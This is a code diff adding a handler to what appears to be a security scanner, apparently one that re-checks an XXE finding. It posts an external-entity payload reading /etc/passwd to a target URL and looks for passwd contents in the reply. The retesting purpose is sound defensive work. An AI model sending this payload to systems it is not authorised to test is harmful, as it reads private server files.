@@ -247,6 +247,58 @@ def _emit_xxe_finding(
         return None
 
 
+# §4 / P1 — re-run handler. Probes the same endpoint with a minimal
+# external-entity payload reading /etc/passwd. Patched parser
+# rejects DOCTYPE or doesn't resolve external entities → no
+# passwd fingerprint in response.
+
+def _rerun_xxe(*, finding_context: dict[str, Any]) -> "Any":
+    from strix.agents.rerun_registry import RerunResult
+    import time as _time
+    start = _time.monotonic()
+    url = finding_context.get("url") or ""
+    if not url:
+        return RerunResult(outcome="indeterminate", detail="missing url")
+    try:
+        from strix.tools.proxy.proxy_manager import get_proxy_manager
+        pm = get_proxy_manager()
+    except Exception:  # noqa: BLE001
+        return RerunResult(outcome="indeterminate", detail="proxy unavailable")
+    payload = (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        '<foo>&xxe;</foo>'
+    )
+    try:
+        resp = pm.send_simple_request(
+            "POST", url, headers={"Content-Type": "application/xml"},
+            body=payload, timeout=15,
+        )
+    except Exception as e:  # noqa: BLE001
+        return RerunResult(outcome="indeterminate", detail=f"transport: {e}")
+    body = resp.get("body") or ""
+    if not isinstance(body, str):
+        body = ""
+    if "root:" in body and "/bin/" in body:
+        return RerunResult(
+            outcome="still_fires",
+            detail="passwd fingerprint present — parser still resolves entities",
+            elapsed_seconds=_time.monotonic() - start,
+        )
+    return RerunResult(
+        outcome="no_longer_fires",
+        detail="no passwd fingerprint in response",
+        elapsed_seconds=_time.monotonic() - start,
+    )
+
+
+try:
+    from strix.agents.rerun_registry import register_rerun
+    register_rerun(category="xxe", cwe="CWE-611")(_rerun_xxe)
+except Exception as e:  # noqa: BLE001
+    logger.debug("scan_xxe: rerun register failed: %s", e)
+
+
 @register_specialist_tool(
     category="xxe-specialist",
     llm=False,
